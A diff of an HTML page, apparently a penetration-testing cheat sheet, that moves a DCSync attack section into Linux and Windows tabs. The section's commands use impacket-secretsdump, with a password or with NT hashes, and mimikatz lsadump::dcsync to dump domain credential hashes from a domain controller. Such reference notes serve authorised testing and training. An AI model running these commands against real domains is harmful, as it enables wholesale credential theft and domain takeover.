@@ -201,14 +201,25 @@
 </ul>
 
 <div class="content"><hr>
-<h4 id="abuse-1-dcsync-attack-from-linux">Abuse #1: DCSync Attack (From Linux)</h4>
+<h4 id="abuse-1-dcsync-attack">Abuse #1: DCSync Attack</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With creds</span>
 </span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With hashes</span>
 </span></span><span class="line"><span class="cl">impacket-secretsdump -hashes &lt;LM&gt;:&lt;NT&gt; -just-dc &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt;
-</span></span></code></pre></div><h4 id="abuse-1-dcsync-attack-from-windows">Abuse #1: DCSync Attack (From Windows)</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:administrator&#39;</span> <span class="n">exit</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
